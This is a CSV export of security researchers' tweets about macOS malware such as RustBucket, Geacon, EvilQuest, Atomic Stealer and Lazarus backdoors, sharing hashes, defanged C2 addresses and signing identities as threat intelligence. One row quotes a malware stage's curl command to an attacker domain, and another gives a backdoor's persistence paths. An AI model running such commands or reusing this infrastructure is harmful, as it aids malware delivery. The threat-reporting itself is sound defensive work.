Name,Handle,Timestamp,Verified,Content,Comments,Retweets,Likes,Analytics,Tags,Mentions,Emojis,Profile Image,Tweet Link,Tweet ID
Dinesh_Devadoss,@dineshdina04,2023-07-21T14:36:30.000Z,False,"New #RustBucket samples SHA-1: 70f2095b464f479461e14781a90408da60359a7c#signed 29-May-2023
BBQ BAZAAR PRIVATE LIMITED (7L2UQTVP6F)

Second Stage:
bash -c curl docs-send[.]online/getBalance/usdt/ethereum -s

cc: ",0,5,14,1.3万,"['#RustBucket', '#signed', '', '', '']",[''],['\\U0001faa3'],https://pbs.twimg.com/profile_images/1661710966936031234/vT7jRQac_normal.jpg,https://twitter.com/dineshdina04/status/1682399154314825728,tweet_id:1682399154314825728
Phil Stokes ⫍⫎,@philofishal,2023-06-13T14:23:47.000Z,False,"Atomic Stealer (aka Amos Atomic) new C2: 94[.]142[.]138[.]177. 
Also new  #macOS #malware behavioral indicator: ""giving up after 9999999"" (fairly sure #AppleScript will time out long before that). More info: https://s1.ai/amos ",1,10,37,"7,925","['#macOS', '#malware', '#AppleScript']","['@dineshdina04', '@LabsSentinel']","['\\U0001f508', '\\U0001f34e', '\\U0001f937\\U0001f3fd\\u200d\\u2642\\ufe0f']",https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1668625216434737156,tweet_id:1668625216434737156
SentinelOne,@SentinelOne,2023-06-02T18:49:00.000Z,True," In case you missed this from the front lines: The development of a Go implementation of Cobalt Strike called ‘Geacon’ appears to be bringing Cobalt Strike capabilities to macOS threat actors. By  and  

Read the blog post:",0,5,20,"4,117",[],"['@philofishal', '@dineshdina04']",['\\U0001f34e'],https://pbs.twimg.com/profile_images/1771237092716343298/SYZM0yv6_normal.png,https://twitter.com/SentinelOne/status/1664705691955744797,tweet_id:1664705691955744797
Phil Stokes ⫍⫎,@philofishal,2023-05-31T16:12:09.000Z,True,"Is #r2 harder to learn than other #malware reversing platforms? Not sure it is - it's just the learning path is different. Macros and aliases are a great way to flatten that curve. Also, binary diffing in r2  Can't tell you how much I love this platform! ",0,6,13,"4,024","['#r2', '#malware']",[],"['\\U0001f60d', '\\U0001f49c']",https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1663941446205046785,tweet_id:1663941446205046785
Dinesh_Devadoss,@dineshdina04,2023-05-25T09:17:38.000Z,False,"Another RustBucket Sample #signed 15-May-2023 
Authority=Developer ID Application: DPS EXPRESS COMPANY LIMITED (PN6L92RH7B)

This time Stage-1 Apple Script is obfuscated. 
C2: docs-send[.]com (next stage downloader url)#BlueNoroff #Lazarus #APT",0,6,10,"2,899","['#signed', '#BlueNoroff', '#Lazarus', '#APT']",[],[],https://pbs.twimg.com/profile_images/1661710966936031234/vT7jRQac_normal.jpg,https://twitter.com/dineshdina04/status/1661662800471797760,tweet_id:1661662800471797760
Virus Bulletin,@virusbtn,2023-05-16T10:14:00.000Z,False,SentinelOne's Phil Stokes () & Dinesh Devadoss () highlight two recent Geacon samples and describe their delivery mechanisms and main characteristics. Geacon is a Go implementation of CobaltStrike for macOS. https://sentinelone.com/blog/geacon-brings-cobalt-strike-capabilities-to-macos-threat-actors/…,0,9,16,"4,181",[],"['@philofishal', '@dineshdina04']",[],https://pbs.twimg.com/profile_images/930351888582828032/b3K7GvSt_normal.jpg,https://twitter.com/virusbtn/status/1658415493953486849,tweet_id:1658415493953486849
Dinesh_Devadoss,@dineshdina04,2023-05-15T15:04:52.000Z,True,"Check out my new Blog! 
It's about Geacon: a Go implementation of Cobalt Strike targeting macOS. 

Special thanks to , who made this possible #macOS #malware #Geacon #CobaltStrike""",0,1,5,"2,701","['#macOS', '#malware', '#Geacon', '#CobaltStrike']",['@philofishal'],"['\\U0001f34e', '\\U0001f64f']",https://pbs.twimg.com/profile_images/1661710966936031234/vT7jRQac_normal.jpg,https://twitter.com/dineshdina04/status/1658126305223745537,tweet_id:1658126305223745537
Phil Stokes ⫍⫎,@philofishal,2023-04-24T16:39:20.000Z,False,"Great work by  uncovering multi-stage APT attack on macOS target. 
Stage 1 is an AppleScript applet;
Stage 2 is Obj-C
Stage  3 is Rust.
Just for good measure, I found another Stage 2 written in Swift.
ed4f16b36bc47a701814b63e30d8ea7a226ca906",0,5,12,883,[],['@JAMF'],[],https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1650539935500316679,tweet_id:1650539935500316679
Phil Stokes ⫍⫎,@philofishal,2023-04-18T17:44:39.000Z,True,Dove in to the #lockbit #ransomware targeting #Apple #macOS ARM devices. Interesting that the decryptor code doesn't appear to be xref'd from anywhere. Still on the #malware authors' todo list? #security,2,6,8,"4,267","['#lockbit', '#ransomware', '#Apple', '#macOS', '#malware', '#security']",[],[],https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1648382045800857626,tweet_id:1648382045800857626
Dinesh_Devadoss,@dineshdina04,2023-04-03T06:00:45.000Z,False,,0,0,3,267,[],[],['\\U0001f64f'],https://pbs.twimg.com/profile_images/1661710966936031234/vT7jRQac_normal.jpg,https://twitter.com/dineshdina04/status/1642769082306146304,tweet_id:1642769082306146304
SentinelOne,@SentinelOne,2023-01-26T18:02:05.000Z,True," Here are the top threats of 2022 our WatchTower hunters saw targeting #Windows Qakbot remains the leader. Raspberry Robin was the fastest growing in the latter half of the year and should be closely watched as we enter 2023.

Read the full report: https://sentinelone.com/resources/watchtower-end-of-year-2022-intelligence-driven-threat-hunting/…",1,3,2,"1,169",['#Windows'],[],['\\U0001fa9f'],https://pbs.twimg.com/profile_images/1771237092716343298/SYZM0yv6_normal.png,https://twitter.com/SentinelOne/status/1618670624636866571,tweet_id:1618670624636866571
Phil Stokes ⫍⫎,@philofishal,2022-12-09T19:08:45.000Z,False,"More details on all of these and a few others (#IronTiger, #SysJoker) in our 2022 #apple #macos #malware roundup post here: 12/12",2,5,9,0,"['#IronTiger', '#SysJoker', '#apple', '#macos', '#malware']",[],[],https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1601292784291352576,tweet_id:1601292784291352576
Phil Stokes ⫍⫎,@philofishal,2022-12-09T19:07:37.000Z,False,"#Pymafka - found by Sonatype, a malicious Python package targeting the popular PyPI registry. The Mach-O uses an obfuscation method similar to #OSX.Zuru to hide a #cobaltstrike beacon. 10/12",1,2,4,0,"['#Pymafka', '#OSX', '#cobaltstrike']",[],[],https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1601292501750779908,tweet_id:1601292501750779908
Phil Stokes ⫍⫎,@philofishal,2022-12-09T19:07:18.000Z,False,"#oRAT - found in late April 2022 by TrendMicro, targets the Windows, Linux, and macOS platforms. SentinelOne reported on the Mach-O variant here: 9/12https://sentinelone.com/blog/from-the-front-lines-unsigned-macos-orat-malware-gambles-for-the-win/…",1,1,3,0,['#oRAT'],[],[],https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1601292422054838272,tweet_id:1601292422054838272
Phil Stokes ⫍⫎,@philofishal,2022-12-09T19:02:49.000Z,False,"In case you missed it, here's 10 new #malware strains and campaigns we spotted attacking #macOS in 2022 #apple #mac #security A  thread >>  1/12",1,16,32,0,"['#malware', '#macOS', '#apple', '#mac', '#security']",[],['\\U0001f9f5'],https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1601291294462324736,tweet_id:1601291294462324736
Phil Stokes ⫍⫎,@philofishal,2022-08-22T23:39:39.000Z,False,"Update on #xcsset #malware aka #dubrobber still targeting #macos #ios devs. Same tricks, new IoCs with awesome work from . https://sentinelone.com/blog/xcsset-malware-update-macos-threat-actors-prepare-for-life-without-python/…  ",0,11,22,0,"['#xcsset', '#malware', '#dubrobber', '#macos', '#ios']","['@dineshdina04', '@SentinelOne', '@LabsSentinel']",[],https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1561860681825132549,tweet_id:1561860681825132549
Phil Stokes ⫍⫎,@philofishal,2022-05-09T18:39:25.000Z,False," Great work by  #reversing oRAT, a new #macOS #malware disclosed by TrendMicro that targets gambling websites. #apple #security https://sentinelone.com/blog/from-the-front-lines-unsigned-macos-orat-malware-gambles-for-the-win/…",0,4,8,0,"['#reversing', '#macOS', '#malware', '#apple', '#security']",['@dineshdina04'],['\\u25b6\\ufe0f'],https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1523734401493913601,tweet_id:1523734401493913601
Phil Stokes ⫍⫎,@philofishal,2021-11-16T13:25:22.000Z,False,Not everyday I get to look at an #APT #Backdoor targeting #macOS users and #hongkong #democracy activists. Fascinating to see some of the artifacts and possible links to #android #malware. #security  #behavioral detection   https://sentinelone.com/labs/infect-if-needed-a-deeper-dive-into-targeted-backdoor-macos-macma/…,0,8,11,0,"['#APT', '#Backdoor', '#macOS', '#hongkong', '#democracy', '#android', '#malware', '#security', '#behavioral']","['@SentinelOne', '@LabsSentinel']","['\\U0001f49c', '\\U0001f600']",https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1460599879248465922,tweet_id:1460599879248465922
SentinelOne,@SentinelOne,2021-08-11T14:06:10.000Z,True," New on SentinelLabs! #AdLoad is a common #adware threat afflicting #macOS , undetected by #apple's XProtect. Learn how to detect this widespread browser hijacker, its infection pattern, and indicators of compromise. By  https://labs.sentinelone.com/massive-new-adload-campaign-goes-entirely-undetected-by-apples-xprotect/…#infosec #security",1,11,11,0,"['#AdLoad', '#adware', '#macOS', '#apple', '#infosec', '#security']",['@philofishal'],['\\U0001f525'],https://pbs.twimg.com/profile_images/1771237092716343298/SYZM0yv6_normal.png,https://twitter.com/SentinelOne/status/1425458522863460664,tweet_id:1425458522863460664
ConfiantIntel,@ConfiantIntel,2021-03-04T15:02:56.000Z,False," found yet another  notarized App, this time it is a backdoored Electrum Wallet (thread)  Signed with :

Authority=Developer ID Application: Viktoriia Abaeva (QVU8CNY775)",3,46,79,0,[],"['@lordx64', '@Apple']","['\\U0001f61f', '\\U0001f47e']",https://pbs.twimg.com/profile_images/1336717236552294407/I-NcfXb0_normal.jpg,https://twitter.com/ConfiantIntel/status/1367490751957975058,tweet_id:1367490751957975058
Patrick Wardle,@patrickwardle,2021-02-17T19:50:17.000Z,True," Uncovered (the first?) malicious program compiled to natively target Apple Silicon (M1/arm64)

And neat fact, was originally flagged & submitted via an  tool! Read: ""Arm'd & Dangerous""",7,76,156,0,[],['@objective_see'],"['\\U0001f34e', '\\U0001f41b', '\\U0001f525']",https://pbs.twimg.com/profile_images/459421488110505985/_rWZpdq1_normal.png,https://twitter.com/patrickwardle/status/1362127246056587266,tweet_id:1362127246056587266
Virus Bulletin,@virusbtn,2020-10-01T13:04:01.000Z,False,ZDNet writes about  and @rockrajesh12493's VB2020 localhost presentation on the Linkury adware that is linked to full-blown malware https://zdnet.com/article/linkury-adware-caught-distributing-full-blown-malware/…,0,3,2,0,[],['@myarun88_2'],[],https://pbs.twimg.com/profile_images/930351888582828032/b3K7GvSt_normal.jpg,https://twitter.com/virusbtn/status/1311653094476976129,tweet_id:1311653094476976129
ZDNET,@ZDNET,2020-10-01T06:15:02.000Z,True,Linkury adware caught distributing full-blown malware https://zdnet.com/article/linkury-adware-caught-distributing-full-blown-malware/?ftag=COS-05-10aaa0g&taid=5f7573e6d07f490001f95991&utm_campaign=trueAnthem%3A+Trending+Content&utm_medium=trueAnthem&utm_source=twitter…,0,5,4,0,[],[],[],https://pbs.twimg.com/profile_images/1559907818353868811/aipjSKiD_normal.jpg,https://twitter.com/ZDNET/status/1311550171403235329,tweet_id:1311550171403235329
Patrick Wardle,@patrickwardle,2020-09-27T04:18:16.000Z,True," New Blog: ""FinSpy Filleted ""  Dives into FinFisher's (commercial) macOS implant FinSpy: https://patreon.com/posts/42064704Builds on 's writeup (https://amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/…), detailing the malware'sother exploits kernel-mode rootkit
...& more!

H/T ",1,66,144,0,[],"['@amnesty', '']","['\\U0001f4dd', '\\U0001f41f', '\\U0001f52c', '\\U0001f9a0', '\\U0001f513', '\\u2699\\ufe0f', '\\U0001f64f']",https://pbs.twimg.com/profile_images/459421488110505985/_rWZpdq1_normal.png,https://twitter.com/patrickwardle/status/1310071233589858304,tweet_id:1310071233589858304
Objective-See Foundation,@objective_see,2020-08-01T20:05:58.000Z,False," New (guest) blog post: ""CVE-2020–9854: ""Unauthd"" https://objective-see.com/blog/blog_0x4D.html… by: Ilias Morad ()

Impressive exploit chain that combines three macOS logic bugs, to elevate privileges from user, to ring-0!     Have a read!
...and mahalo to  ",3,99,239,0,[],"['@A2nkF_', '@A2nkF_']","['\\U0001f4dd', '\\U0001f517', '\\u270d\\ufe0f', '\\U0001f41b', '\\U0001fab2', '\\U0001f41e', '\\U0001f51c', '\\U0001f451', '\\U0001f64f']",https://pbs.twimg.com/profile_images/578447161890734080/CaY75aNi_normal.png,https://twitter.com/objective_see/status/1289653620640645120,tweet_id:1289653620640645120
Cyber Threat Alliance,@CyberAlliance,2020-07-02T13:23:47.000Z,False,MacOS ransomware is rare. Thank you  &  for the early share of your research on new macOS ransomware EvilQuest with  membershttps://labs.k7computing.com/?p=20553#CTAearlyshares #threatintelligence #EmpoweringCTA,0,9,12,0,"['#CTAearlyshares', '#threatintelligence', '#EmpoweringCTA']","['@K7computing', '@dineshdina04', '@CyberAlliance']",[],https://pbs.twimg.com/profile_images/578302707263377408/iSkUlX02_normal.jpeg,https://twitter.com/CyberAlliance/status/1278680772761673730,tweet_id:1278680772761673730
K7 Computing,@k7computing,2020-07-02T13:28:05.000Z,False," Threat Researcher Dinesh Devadoss () has discovered the newest macOS  #ransomware - EvilQuest,  which comes bundled with pirated #macOS software masquerading as a legitimate program. Learn more about it here: https://bit.ly/3dQ6fjP#K7Labs #K7Security",1,3,7,0,"['#ransomware', '#macOS', '#K7Labs', '#K7Security']","['@k7computing', '@dineshdina04']",[],https://pbs.twimg.com/profile_images/1154612975174422528/la6R9wJd_normal.jpg,https://twitter.com/k7computing/status/1278681854405570563,tweet_id:1278681854405570563
Lokesh,@Loki_RE_artist,2020-07-05T11:04:14.000Z,False,"#cobaltstrike disguised as #Microsoft (#Microsoft365) OfficeSetup.exe downloaded from https[:]//download.moffice365.live 

md5:
9f80ece462c2d08eac833ed079c29fa9
ec69bdd5b549f54df5e79997b830c9b4     ",1,37,81,0,"['#cobaltstrike', '#Microsoft', '#Microsoft365']","['@VK_Intel', '@malwrhunterteam', '@James_inthe_box', '@cyb3rops', '@DissectMalware', '@JAMESWT_MHT']",[],https://pbs.twimg.com/profile_images/1208937200093736960/X3MnDXjN_normal.jpg,https://twitter.com/Loki_RE_artist/status/1279732816041959424,tweet_id:1279732816041959424
WIRED,@WIRED,2020-07-01T20:56:59.000Z,True,The discovery of a new type of Mac ransomware alone was significant. Then researchers found it has a whole other set of spyware capabilities,2,69,108,0,[],[],[],https://pbs.twimg.com/profile_images/1228050699348561920/YvWAQD2L_normal.jpg,https://twitter.com/WIRED/status/1278432435475222529,tweet_id:1278432435475222529
Patrick Wardle,@patrickwardle,2020-07-02T02:58:04.000Z,True,...I'm all about being lazy and simply asking the malware to decrypt all it secrets! ,1,11,46,0,[],[],['\\U0001f605'],https://pbs.twimg.com/profile_images/459421488110505985/_rWZpdq1_normal.png,https://twitter.com/patrickwardle/status/1278523304563707905,tweet_id:1278523304563707905
BleepingComputer,@BleepinComputer,2020-07-01T01:06:13.000Z,True,New EvilQuest ransomware turns out to be a macOS wiper and file stealer in disguise.,1,87,119,0,[],[],[],https://pbs.twimg.com/profile_images/1699832227062792192/hqaQ8bMZ_normal.jpg,https://twitter.com/BleepinComputer/status/1278132771089678336,tweet_id:1278132771089678336
Patrick Wardle,@patrickwardle,2020-06-30T09:27:33.000Z,True,Mahalo for the tag!! ...my (initial) analysis on it:,1,4,25,0,[],[],['\\U0001f64f'],https://pbs.twimg.com/profile_images/459421488110505985/_rWZpdq1_normal.png,https://twitter.com/patrickwardle/status/1277896544813936640,tweet_id:1277896544813936640
Dinesh_Devadoss,@dineshdina04,2020-06-29T18:19:24.000Z,False,"#macOS #ransomware impersonating as Google Software Update program with zero detection. 

MD5: 
522962021E383C44AFBD0BC788CF6DA3 6D1A07F57DA74F474B050228C6422790 98638D7CD7FE750B6EAB5B46FF102ABD  ",12,143,200,0,"['#macOS', '#ransomware']","['@philofishal', '@patrickwardle', '@thomasareed']",[],https://pbs.twimg.com/profile_images/1661710966936031234/vT7jRQac_normal.jpg,https://twitter.com/dineshdina04/status/1277668001538433025,tweet_id:1277668001538433025
Dinesh_Devadoss,@dineshdina04,2020-06-29T18:35:30.000Z,False,"After encryption, the ransomware adds a marker BEBABEDD to the EOF.",0,4,17,0,[],[],[],https://pbs.twimg.com/profile_images/1661710966936031234/vT7jRQac_normal.jpg,https://twitter.com/dineshdina04/status/1277672052686614528,tweet_id:1277672052686614528
Intego Mac Security,@IntegoSecurity,2020-06-17T18:17:43.000Z,False,"The latest Mac malware bypasses 's security measures simply by instructing users to ""right-click.""  Very few antivirus apps detect it.  Are you protected? #PSA #onlinesafety #Shlayer #Bundlore",1,7,15,0,"['#PSA', '#onlinesafety', '#Shlayer', '#Bundlore']",['@Apple'],"['\\U0001f34e', '\\U0001f513', '\\U0001f6e1', '\\U0001f513']",https://pbs.twimg.com/profile_images/877183445134225408/OXB9cCN__normal.jpg,https://twitter.com/IntegoSecurity/status/1273318923425902592,tweet_id:1273318923425902592
Dinesh_Devadoss,@dineshdina04,2020-05-22T07:58:49.000Z,False,"#Adload MacOS downloader in #Golang. 
MD5: 427039a198b757fa81ffa87ab9acd5b3 ",2,1,6,0,"['#Adload', '#Golang']","['@philofishal', '@thomasareed']",[],https://pbs.twimg.com/profile_images/1661710966936031234/vT7jRQac_normal.jpg,https://twitter.com/dineshdina04/status/1263741090806394881,tweet_id:1263741090806394881
ThreatDown,@Threat_Down,2020-05-06T16:01:33.000Z,False,"New Mac variant of #Lazarus #Dacls RAT distributed via Trojanized 2FA app.

Thanks ,   and .",0,15,11,0,"['#Lazarus', '#Dacls']","['@hadianjazi', '@thomasareed', '@jeromesegura']",[],https://pbs.twimg.com/profile_images/1721868444637798400/R6-hmQZM_normal.png,https://twitter.com/Threat_Down/status/1258064366986911746,tweet_id:1258064366986911746
Phil Stokes ⫍⫎,@philofishal,2020-05-05T13:51:54.000Z,False,"Suspected #Lazarus backdoor/RAT
Disguised bin: ../Resources/Base.lproj/SubMenu.nib; cp'd ~/Library/.mina. Exec via ~/Lib*/LaunchAgents/com.aex-loop.agent.plist. Rev shell & wolfSSL wrapped in MinaOTP-MAC app. h/t   #malware #macos #security",1,28,52,0,"['#Lazarus', '#malware', '#macos', '#security']","['@thomasareed', '@virustotal', '@LabsSentinel']",[],https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1257669351899086849,tweet_id:1257669351899086849
Dinesh_Devadoss,@dineshdina04,2020-04-08T13:40:58.000Z,False,#OSX_Pirrit adware using compiler level-obfuscation. https://labs.k7computing.com/?p=20052,0,1,1,0,['#OSX_Pirrit'],['@0xAmit'],[],https://pbs.twimg.com/profile_images/1661710966936031234/vT7jRQac_normal.jpg,https://twitter.com/dineshdina04/status/1247882128114630665,tweet_id:1247882128114630665
Thomas Reed,@thomasareed,2020-02-27T19:32:44.000Z,False,"If you're not worried about Mac adware, you may want to learn more about it. Adware is the most sophisticated threat on the Mac. Since it's more noticeable to the user than malware, it has had to evolve where malware has not. #macOS #malware",1,16,32,0,"['#macOS', '#malware']",[],[],https://pbs.twimg.com/profile_images/1231200568405872642/LWgwpUV-_normal.jpg,https://twitter.com/thomasareed/status/1233112750542462978,tweet_id:1233112750542462978
Objective-See Foundation,@objective_see,2020-02-26T18:01:31.000Z,False,"New Research: ""Weaponizing a Lazarus Group Implant"": https://objective-see.com/blog/blog_0x54.html…On repurposing Lazarus APT group's () 1st-stage implant, to execute custom 2nd-stage payloads directly from memory! ....also  code (ab)used in the malware?! ",2,84,185,0,[],['@cylanceinc'],"['\\U0001f4dd', '\\U0001f1f0\\U0001f1f5', '\\U0001f601', '\\U0001f608', '\\U0001f602']",https://pbs.twimg.com/profile_images/578447161890734080/CaY75aNi_normal.png,https://twitter.com/objective_see/status/1232727409251635201,tweet_id:1232727409251635201
Phil Stokes ⫍⫎,@philofishal,2020-01-08T19:45:02.000Z,False,"Three new rule families in #XProtect v2111 for #MacOS #Catalina dropped by #Apple early yesterday. Some interesting changes in MRT v1.52, too (more on that later!).",3,9,15,0,"['#XProtect', '#MacOS', '#Catalina', '#Apple']",[],[],https://pbs.twimg.com/profile_images/1240268141483057152/6U_2s1Mf_normal.jpg,https://twitter.com/philofishal/status/1214996450851147777,tweet_id:1214996450851147777
Thomas Reed,@thomasareed,2019-12-16T19:30:19.000Z,False,"We saw a big jump in Mac threat detections in 2019 at ... we've got Mac threats in the top five most detected for the first time this year, and saw more than twice as many detections per machine on Mac! #macOS #malware",1,28,49,0,"['#macOS', '#malware']",['@Malwarebytes'],[],https://pbs.twimg.com/profile_images/1231200568405872642/LWgwpUV-_normal.jpg,https://twitter.com/thomasareed/status/1206657826552197126,tweet_id:1206657826552197126
Dinesh_Devadoss,@dineshdina04,2019-12-06T15:43:54.000Z,False,My writeup on the #Lazarus #mac #malware. https://labs.k7computing.com/?p=19416,0,2,5,0,"['#Lazarus', '#mac', '#malware']",[],[],https://pbs.twimg.com/profile_images/1661710966936031234/vT7jRQac_normal.jpg,https://twitter.com/dineshdina04/status/1202976968393650176,tweet_id:1202976968393650176
Patrick Wardle,@patrickwardle,2019-12-04T19:49:07.000Z,True,Mahalo for the tag & sharing info about this sample!! My writeup on the malware:,1,3,11,0,[],[],"['\\U0001f64f', '\\U0001f4dd', '\\U0001f47e']",https://pbs.twimg.com/profile_images/459421488110505985/_rWZpdq1_normal.png,https://twitter.com/patrickwardle/status/1202313903637590016,tweet_id:1202313903637590016
Objective-See Foundation,@objective_see,2019-12-03T21:00:27.000Z,False," (finally) a macOS implant that support direct in-memory execution of remote payloads!  

New blog post: ""Lazarus Group Goes 'Fileless'https://objective-see.com/blog/blog_0x51.html…H/T ",2,128,282,0,[],['@dineshdina04'],"['\\U0001f525', '\\U0001f47e']",https://pbs.twimg.com/profile_images/578447161890734080/CaY75aNi_normal.png,https://twitter.com/objective_see/status/1201969466780704768,tweet_id:1201969466780704768
